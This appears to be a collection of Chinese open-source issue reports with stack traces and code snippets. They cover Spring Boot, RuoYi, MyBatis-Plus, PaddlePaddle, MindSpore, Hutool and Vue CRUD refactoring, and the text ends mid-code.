2019-08-02 00:05:42.621 ERROR 11484 --- [ main] o.s.boot.SpringApplication : Application run failed org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'documentationPluginsBootstrapper' defined in URL [jar:file:/E:/test_mvn_pigx/io/springfox/springfox-spring-web/2.9.2/springfox-spring-web-2.9.2.jar!/springfox/documentation/spring/web/plugins/DocumentationPluginsBootstrapper.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'webMvcRequestHandlerProvider' defined in URL [jar:file:/E:/test_mvn_pigx/io/springfox/springfox-spring-web/2.9.2/springfox-spring-web-2.9.2.jar!/springfox/documentation/spring/web/plugins/WebMvcRequestHandlerProvider.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'requestMappingHandlerMapping' defined in class path resource [org/springframework/boot/autoconfigure/web/servlet/WebMvcAutoConfiguration$EnableWebMvcConfiguration.class]: Invocation of init method failed; nested exception is java.lang.IllegalStateException: Ambiguous mapping. Cannot map 'sysClientController' method public com.pig4cloud.pigx.common.core.util.R com.pig4cloud.pigx.admin.controller.SysClientController.add(com.pig4cloud.pigx.admin.api.entity.SysOauthClientDetails) to {POST /client}: There is already 'oauthClientDetailsController' bean method public com.pig4cloud.pigx.common.core.util.R com.pig4cloud.pigx.admin.controller.OauthClientDetailsController.add(com.pig4cloud.pigx.admin.api.entity.SysOauthClientDetails) mapped. at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:769) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:218) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1341) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1187) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:555) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:515) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:320) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:318) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:199) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:845) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:877) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:549) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:140) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:742) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:389) at org.springframework.boot.SpringApplication.run(SpringApplication.java:311) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1213) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1202) at com.pig4cloud.pigx.admin.PigxAdminApplication.main(PigxAdminApplication.java:40) Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'webMvcRequestHandlerProvider' defined in URL [jar:file:/E:/test_mvn_pigx/io/springfox/springfox-spring-web/2.9.2/springfox-spring-web-2.9.2.jar!/springfox/documentation/spring/web/plugins/WebMvcRequestHandlerProvider.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'requestMappingHandlerMapping' defined in class path resource [org/springframework/boot/autoconfigure/web/servlet/WebMvcAutoConfiguration$EnableWebMvcConfiguration.class]: Invocation of init method failed; nested exception is java.lang.IllegalStateException: Ambiguous mapping. Cannot map 'sysClientController' method public com.pig4cloud.pigx.common.core.util.R com.pig4cloud.pigx.admin.controller.SysClientController.add(com.pig4cloud.pigx.admin.api.entity.SysOauthClientDetails) to {POST /client}: There is already 'oauthClientDetailsController' bean method public com.pig4cloud.pigx.common.core.util.R com.pig4cloud.pigx.admin.controller.OauthClientDetailsController.add(com.pig4cloud.pigx.admin.api.entity.SysOauthClientDetails) mapped. at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:769) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:218) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1341) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1187) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:555) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:515) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:320) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:318) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:199) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:277) at org.springframework.beans.factory.support.DefaultListableBeanFactory.addCandidateEntry(DefaultListableBeanFactory.java:1467) at org.springframework.beans.factory.support.DefaultListableBeanFactory.findAutowireCandidates(DefaultListableBeanFactory.java:1431) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveMultipleBeans(DefaultListableBeanFactory.java:1322) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1209) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1171) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:857) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:760) ... 19 common frames omitted Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'requestMappingHandlerMapping' defined in class path resource [org/springframework/boot/autoconfigure/web/servlet/WebMvcAutoConfiguration$EnableWebMvcConfiguration.class]: Invocation of init method failed; nested exception is java.lang.IllegalStateException: Ambiguous mapping. Cannot map 'sysClientController' method public com.pig4cloud.pigx.common.core.util.R com.pig4cloud.pigx.admin.controller.SysClientController.add(com.pig4cloud.pigx.admin.api.entity.SysOauthClientDetails) to {POST /client}: There is already 'oauthClientDetailsController' bean method public com.pig4cloud.pigx.common.core.util.R com.pig4cloud.pigx.admin.controller.OauthClientDetailsController.add(com.pig4cloud.pigx.admin.api.entity.SysOauthClientDetails) mapped. at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1778) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:593) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:515) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:320) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:318) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:199) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:277) at org.springframework.beans.factory.support.DefaultListableBeanFactory.addCandidateEntry(DefaultListableBeanFactory.java:1467) at org.springframework.beans.factory.support.DefaultListableBeanFactory.findAutowireCandidates(DefaultListableBeanFactory.java:1431) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveMultipleBeans(DefaultListableBeanFactory.java:1322) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1209) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1171) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:857) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:760) ... 36 common frames omitted Caused by: java.lang.IllegalStateException: Ambiguous mapping. Cannot map 'sysClientController' method public com.pig4cloud.pigx.common.core.util.R com.pig4cloud.pigx.admin.controller.SysClientController.add(com.pig4cloud.pigx.admin.api.entity.SysOauthClientDetails) to {POST /client}: There is already 'oauthClientDetailsController' bean method public com.pig4cloud.pigx.common.core.util.R com.pig4cloud.pigx.admin.controller.OauthClientDetailsController.add(com.pig4cloud.pigx.admin.api.entity.SysOauthClientDetails) mapped. at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry.assertUniqueMethodMapping(AbstractHandlerMethodMapping.java:618) at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry.register(AbstractHandlerMethodMapping.java:586) at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.registerHandlerMethod(AbstractHandlerMethodMapping.java:312) at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.lambda$detectHandlerMethods$1(AbstractHandlerMethodMapping.java:282) at java.util.LinkedHashMap.forEach(LinkedHashMap.java:684) at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.detectHandlerMethods(AbstractHandlerMethodMapping.java:280) at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.processCandidateBean(AbstractHandlerMethodMapping.java:252) at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.initHandlerMethods(AbstractHandlerMethodMapping.java:211) at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.afterPropertiesSet(AbstractHandlerMethodMapping.java:199) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.afterPropertiesSet(RequestMappingHandlerMapping.java:164) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1837) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1774) ... 50 common frames omitted Process finished with exit code 1
升级版本后，代码生成报错。,"1.报错环境：升级Spring Cloud相关组件到最新版，此版本。 2.代码生产页面点击生成代码后。后台报错。报错内容如下：   <code>: 11:35:13.437 [http-nio-9202-exec-4] ERROR c.r.c.s.h.GlobalExceptionHandler - [handleException,51] - Handler dispatch failed; nested exception is java.lang.NoClassDefFoundError: org/apache/commons/collections/ExtendedProperties org.springframework.web.util.NestedServletException: Handler dispatch failed; nested exception is java.lang.NoClassDefFoundError: org/apache/commons/collections/ExtendedProperties at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1078) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) at javax.servlet.http.HttpServlet.service(HttpServlet.java:645) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:750) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:96) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) at org.apache.catalina.core.StandardContextValve.__invoke(StandardContextValve.java:97) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:41002) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1707) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748) Caused by: java.lang.NoClassDefFoundError: org/apache/commons/collections/ExtendedProperties at org.apache.velocity.runtime.RuntimeInstance.&lt;init&gt;(RuntimeInstance.java:183) at org.apache.velocity.runtime.RuntimeSingleton.&lt;clinit&gt;(RuntimeSingleton.java:92) at org.apache.velocity.app.Velocity.init(Velocity.java:97) at com.ruoyi.gen.util.VelocityInitializer.initVelocity(VelocityInitializer.java:29) at com.ruoyi.gen.service.GenTableServiceImpl.generatorCode(GenTableServiceImpl.java:345) at com.ruoyi.gen.service.GenTableServiceImpl.downloadCode(GenTableServiceImpl.java:327) at com.ruoyi.gen.service.GenTableServiceImpl$$FastClassBySpringCGLIB$$1.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:688) at com.ruoyi.gen.service.GenTableServiceImpl$$EnhancerBySpringCGLIB$$1.downloadCode(&lt;generated&gt;) at com.ruoyi.gen.controller.GenController.batchGenCode(GenController.java:190) at com.ruoyi.gen.controller.GenController$$FastClassBySpringCGLIB$$1.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:779) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:89) at com.ruoyi.common.security.aspect.PreAuthorizeAspect.around(PreAuthorizeAspect.java:58) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:634) at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:624) at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:72) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:175) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) at org.springframework.aop.aspectj.AspectJAfterThrowingAdvice.invoke(AspectJAfterThrowingAdvice.java:64) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:175) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) at org.springframework.aop.framework.adapter.AfterReturningAdviceInterceptor.invoke(AfterReturningAdviceInterceptor.java:57) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:175) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:97) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:692) at com.ruoyi.gen.controller.GenController$$EnhancerBySpringCGLIB$$1.batchGenCode(&lt;generated&gt;) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:197) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:141) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:894) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1063) ... 44 common frames omitted Caused by: java.lang.ClassNotFoundException: org.apache.commons.collections.ExtendedProperties at java.net.URLClassLoader.findClass(URLClassLoader.java:382) at java.lang.ClassLoader.loadClass(ClassLoader.java:418) at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:355) at java.lang.ClassLoader.loadClass(ClassLoader.java:351) ... 93 common frames omitted"
后台查询记录在页面获取的id问题，类型ID_WORKER,"请问如何解决这个问题？我只能换成UUID吗？   <code>: //获取返回所有user对象 @ResponseBody @RequestMapping(""/data"") public Object data(@RequestParam(value = ""random"", required = false)String random){ if (random == null || StringUtil.isEmpty(random)){ return renderError(""系统错误，请重试！""); } List&lt;User&gt; users = userService.selectList(null); return renderSuccess(users); } $.ajax({ url:""${ctx}/com/user/data"", type:""post"", dataType:""json"", data:{""random"":Math.random()}, success:function (data) { console.info(data); if (data.status == ""200""){ var users = data.obj; //此处有问题 var tablelist = """"; if (users == null || users.length == 0){ tablelist = ""&lt;tr&gt;"" + ""&lt;td colspan='8'&gt;没有任何记录&lt;/td&gt;"" + ""&lt;/tr&gt;""; }else { for (var i=0;i&lt;users.length;i++){ tablelist += ""&lt;tr&gt;"" + ""&lt;td&gt;""+(i+1)+""&lt;/td&gt;"" + ""&lt;td&gt;""+users[i].id+""&lt;/td&gt;"" + ""&lt;td&gt;""+users[i].username+""&lt;/td&gt;"" + ""&lt;td&gt;""+users[i].password+""&lt;/td&gt;"" + ""&lt;td&gt;""+users[i].price+""&lt;/td&gt;"" + ""&lt;td&gt;""+users[i].testType+""&lt;/td&gt;"" + ""&lt;td&gt;""+users[i].version+""&lt;/td&gt;"" + ""&lt;td&gt;&lt;input type='button' name='update' value='更新' onclick='update(""+users[i].id+"");' /&gt;"" + "" &lt;input type='button' name='delete' value='删除' onclick='del(""+users[i].id+"");' /&gt;&lt;/td&gt;"" + ""&lt;/tr&gt;""; } } $(""#list"").html(tablelist); }else { alert(data.msg); $(""#list"").innerHTML = document.write(""&lt;tr&gt;"" + ""&lt;td colspan='7'&gt;没有任何记录&lt;/td&gt;"" + ""&lt;/tr&gt;""); } }"
spawn多卡训练输出都是多条日志？,"PaddlePaddle 2.0.0 Ubuntu 18.04 RXT 2080ti 使用多卡训练，输出的是多条日志的吗？如我用2张显卡训练，输出都是两次日志。有没有办法让它只输出一次？VisualDL记录loss也不好计算   <code>: dist.spawn(train, args=(args,)) I0301 15:40:13.293759 12345 nccl_context.cc:189] init nccl context nranks: 2 local rank: 0 gpu id: 0 ring id: 0 I0301 15:40:13.293788 12346 nccl_context.cc:189] init nccl context nranks: 2 local rank: 1 gpu id: 1 ring id: 0 W0301 15:40:13.521868 12345 device_context.cc:362] Please NOTE: device: 0, GPU Compute Capability: 7.5, Driver API Version: 11.0, Runtime API Version: 10.2 W0301 15:40:13.521914 12346 device_context.cc:362] Please NOTE: device: 1, GPU Compute Capability: 7.5, Driver API Version: 11.0, Runtime API Version: 10.2 W0301 15:40:13.523988 12346 device_context.cc:372] device: 1, cuDNN Version: 7.6. W0301 15:40:13.523988 12345 device_context.cc:372] device: 0, cuDNN Version: 7.6. Epoch 0: ExponentialDecay set learning rate to 0.1. Epoch 0: ExponentialDecay set learning rate to 0.1."
【众智】【计算-GPU开发】SegmentMean,"沿张量的分段计算平均值。 input_x segment_ids output 对应底层算子 Classify Name Type Type Range Required INPUT x float32, float64, int32, uint8, int16, int8, int64,uint16, half, uint32, uint64, complex64, complex128 TRUE INPUT segment_ids int32, int64 TRUE OUTPUT y float32, float64, int32, uint8, int16, int8, int64, uint16, half, uint32, uint64, complex64, complex128 TRUE 标杆接口参考 Tensorflow接口： https://www.tensorflow.org/versions/r2.6/api_docs/python/tf/raw_ops/SegmentMean?hl=zh-tw 3. 异常处理 4. 算子反向 Tensorflow:参考@ops.RegisterGradient(""SegmentMean"")   <code>: class SegmentMean(Primitive):"
 [重大调整] 调整项目结构,整理 文件夹   <code>: Fur.Core Fur.Record Fur.Linq
Failed to load property source from location 'classpath:/bootstrap.yml',"系统：macos java version ""1.8.0_211"" idea 2020.3 拉下来启动每个服务都是这样，没改什么   <code>: java.lang.IllegalStateException: Failed to load property source from location 'classpath:/bootstrap.yml' Caused by: org.yaml.snakeyaml.reader.ReaderException: special characters are not allowed"
5.1.0版本Convert.toByteArray(Object value);转换异常,"使用的JDK版本和Hutool版本 JDK-1.8, Hutool-5.1.0 类型转换异常   <code>: Byte[] beanBytes = Convert.toByteArray(new Product(""Flink"", ""老二疤子"", ""4.4.4"")); cn.hutool.core.convert.ConvertException: No Converter for type [[Ljava.lang.Byte;]"
【众智】【计算-AICPU开发】Real,"AICPU算子接入 返回复数的实部。 input output 对应底层算子 对应底层AICPU算子Real: (Tout实际未用到，且为了避免与库上接口冲突，故删了此参数） @ops.RegisterGradient(""Real"")   <code>: class Real(Primitive):"
前端UI页面重复代码重构,"前端重复代码太多，影响代码阅读性，增加不必要的工作量 提取公共常用的代码到公共类中，全局使用 已适用我们项目好几个月了，现在有时间分享出来，稳定无bug 重构前 重构后 用法 1. 创建组件文件base.js 2. 在main.js引用组件，并全局使用 3. 可自定义扩展自定义方法(可选) 例如在组件中改成 页面使用   <code>: &lt;template&gt; &lt;div class=""execution""&gt; &lt;basic-container&gt; &lt;avue-crud ref=""crud"" :page=""page"" :data=""tableData"" :permission=""permissionList"" :table-loading=""tableLoading"" :option=""tableOption"" @on-load=""getList"" @search-change=""searchChange"" @refresh-change=""refreshChange"" @size-change=""sizeChange"" @current-change=""currentChange"" @row-update=""handleUpdate"" @row-save=""handleSave"" @row-del=""rowDel""&gt; &lt;/avue-crud&gt; &lt;/basic-container&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; import {fetchList, getObj, addObj, putObj, delObj} from '@/api/${pathName}' import {tableOption} from '@/const/crud/${pathName}' import {mapGetters} from 'vuex' export default { name: '${pathName}', data() { return { searchForm: {}, tableData: [], page: { total: 0, // 总页数 currentPage: 1, // 当前页数 pageSize: 20 // 每页显示多少条 }, tableLoading: false, tableOption: tableOption } }, computed: { ...mapGetters(['permissions']), permissionList() { return { addBtn: this.vaildData(this.permissions.${moduleName}_${pathName}_add, false), delBtn: this.vaildData(this.permissions.${moduleName}_${pathName}_del, false), editBtn: this.vaildData(this.permissions.${moduleName}_${pathName}_edit, false) }; } }, methods: { getList(page, params) { this.tableLoading = true fetchList(Object.assign({ current: page.currentPage, size: page.pageSize }, params, this.searchForm )).then(response =&gt; { this.tableData = response.data.data.records this.page.total = response.data.data.total this.tableLoading = false }).catch(() =&gt; { this.tableLoading=false }) }, rowDel: function (row, index) { this.$confirm('是否确认删除ID为' + row.$pk.lowerAttrName, '提示', { confirmButtonText: '确定', cancelButtonText: '取消', type: 'warning' }).then(function () { return delObj(row.$pk.lowerAttrName) }).then(data =&gt; { this.$message.success('删除成功') this.getList(this.page) }) }, handleUpdate: function (row, index, done,loading) { putObj(row).then(data =&gt; { this.$message.success('修改成功') done() this.getList(this.page) }).catch(() =&gt; { loading(); }); }, handleSave: function (row, done,loading) { addObj(row).then(data =&gt; { this.$message.success('添加成功') done() this.getList(this.page) }).catch(() =&gt; { loading(); }); }, sizeChange(pageSize){ this.page.pageSize = pageSize }, currentChange(current){ this.page.currentPage = current }, searchChange(form, done) { this.searchForm = form this.page.currentPage = 1 this.getList(this.page, form) done() }, refreshChange() { this.getList(this.page) } } } &lt;/script&gt; &lt;template&gt; &lt;div class=""execution""&gt; &lt;basic-container&gt; &lt;avue-crud ref=""crud"" v-model=""crudModel"" :page=""page"" :data=""tableData"" :permission=""permissionList"" :table-loading=""tableLoading"" :option=""tableOption"" @on-load=""BASE.getList(arguments,thisObj)"" @search-change=""BASE.searchChange(arguments,thisObj)"" @search-reset=""BASE.searchReset(thisObj)"" @refresh-change=""BASE.refreshChange(thisObj)"" @size-change=""BASE.sizeChange($event,thisObj)"" @current-change=""BASE.currentChange($event,thisObj)"" @row-update=""BASE.handleUpdate(arguments,thisObj)"" @row-save=""BASE.handleSave(arguments,thisObj)"" @row-del=""BASE.rowDel(arguments,thisObj)"" &gt;&lt;/avue-crud&gt; &lt;/basic-container&gt; &lt;/div&gt; &lt;/template&gt; &lt;script&gt; import {fetchList, getObj, addObj, putObj, delObj} from '@/api/${moduleName}/${pathName}' import {tableOption} from '@/const/crud/${moduleName}/${pathName}' import {mapGetters} from 'vuex' export default { name: '${pathName}', data() { return { thisObj: this, fetchList: fetchList, addObj: addObj, putObj: putObj, delObj: delObj, searchForm: {}, crudModel: {}, tableData: [], page: { total: 0, // 总页数 currentPage: 1, // 当前页数 pageSize: 10 // 每页显示多少条 }, tableLoading: false, tableOption: tableOption }; }, computed: { ...mapGetters([""permissions""]), permissionList() { return this.BASE.handlePermission(this.thisObj,'${moduleName}_${pathName}_add','${moduleName}_${pathName}_del','${moduleName}_${pathName}_edit'); } }, methods: {} }; &lt;/script&gt; // 以下为crud组件公共增删改查及事件回调方法 若有特定需求则在自己vue中实现或以参数形式传入 /** * 搜索回调 * @param selfSelectFunction 自定义勾选方法,非必传 */ const searchChange = function (argumentsArr, _this) { var form = argumentsArr[0]; var done = argumentsArr[1]; _this.searchForm = Object.assign(_this.searchForm, form); getRestList(_this); done() }; /** * 重置查询回调 * @param {*} _this */ const getRestList = function (_this) { _this.page = { total: 0, // 总页数 currentPage: 1, // 当前页数 pageSize: 10 // 每页显示多少条 }; getList([_this.page, _this.searchForm], _this); } /* * 切换页数回调 */ const currentChange = function (page, _this) { _this.page.currentPage = page; }; /** * 显示条数修改回调 */ const sizeChange = function (pageSize, _this) { _this.page.pageSize = pageSize; }; /** * 刷新回调 */ const refreshChange = function (_this) { getList([_this.page, _this.searchForm], _this); }; /** * 重置回调 */ const searchReset = function (_this, selfResetFunction) { _this.searchForm = {}; if (selfResetFunction &amp;&amp; typeof selfResetFunction == ""function"") { selfResetFunction(); } getRestList(_this); }; /** * 勾选回调 */ const selectionChange = function (list, _this) { _this.list = list; }; /** * crud查询方法 */ const getList = function (argumentsArr, _this) { var page = argumentsArr[0]; var params = argumentsArr[1]; _this.tableLoading = true; _this.fetchList( Object.assign({ current: page.currentPage, size: page.pageSize }, params, 